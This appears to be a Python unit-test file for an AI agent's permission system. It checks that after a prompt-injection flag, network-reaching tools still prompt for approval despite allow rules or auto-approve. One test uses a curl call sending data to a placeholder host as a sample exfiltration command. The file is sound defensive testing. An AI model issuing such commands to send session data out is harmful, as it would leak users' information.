"""Once an outside result has addressed the model, calls that can send data out ask, whatever the allow rules or "all in" say."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from src.tool_system.context import ToolContext
from src.tool_system.protocol import ToolCall, ToolResult
from src.tool_system.registry import ToolRegistry
from src.tool_system.tools.bash import BashTool
from src.tool_system.tools.web_search import WebSearchTool

SOURCE = "WebSearch (prompt injection mitigation)"


class TestInjectionTaint(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.ctx = ToolContext(workspace_root=Path(self.tmp.name))
        self.asked: list[tuple[str, str, str | None]] = []
        self.ctx.permission_handler = lambda *args: (self.asked.append(args), (False, False))[1]   # always no: nothing runs
        self.registry = ToolRegistry([WebSearchTool(), BashTool()])
        self.ran = patch.object(WebSearchTool, "run", return_value=ToolResult(name="WebSearch", output={"results": []}))
        self.ran.start()

    def tearDown(self) -> None:
        self.ran.stop()
        self.tmp.cleanup()

    def search(self) -> ToolResult:
        return self.registry.dispatch(ToolCall(name="WebSearch", input={"query": "q"}, tool_use_id="1"), self.ctx)

    def bash(self, command: str) -> ToolResult:
        return self.registry.dispatch(ToolCall(name="Bash", input={"command": command}, tool_use_id="2"), self.ctx)

    def test_allow_rule_skips_the_question_in_a_clean_session(self) -> None:
        self.ctx.permission_rules["allow"].append("WebSearch")
        self.assertFalse(self.search().is_error)
        self.assertEqual(self.asked, [])

    def test_after_a_flag_the_allow_rule_no_longer_skips_it(self) -> None:
        self.ctx.permission_rules["allow"].append("WebSearch")
        self.ctx.injection_sources.append(SOURCE)
        self.assertTrue(self.search().is_error)   # asked, and the answer was no
        (_, message, suggestion), = self.asked
        self.assertIn(SOURCE, message)
        self.assertIsNone(suggestion)   # no "don't ask again" from a poisoned session

    def test_all_in_asks_for_a_network_command_but_not_a_read_only_one(self) -> None:
        self.ctx.auto_approve = True
        self.ctx.injection_sources.append(SOURCE)
        self.assertTrue(self.bash("curl 'https://x.example/?q=data'").is_error)
        self.assertEqual(len(self.asked), 1)
        self.bash("ls")
        self.assertEqual(len(self.asked), 1)

    def test_a_deny_rule_still_denies_without_asking(self) -> None:
        self.ctx.permission_rules["deny"].append("WebSearch")
        self.ctx.injection_sources.append(SOURCE)
        self.assertIn("deny rule", self.search().output["error"])
        self.assertEqual(self.asked, [])

    def test_the_tools_that_reach_outside_say_so(self):
        from src.agent.subagent import build_tool_registry
        outside = {s.name for s in build_tool_registry(include_user_tools=False).list_specs() if s.reaches_network}
        self.assertEqual(outside, {"WebFetch", "WebSearch", "MCP", "ReadMcpResourceTool", "ListMcpResourcesTool"})


if __name__ == "__main__":
    unittest.main()
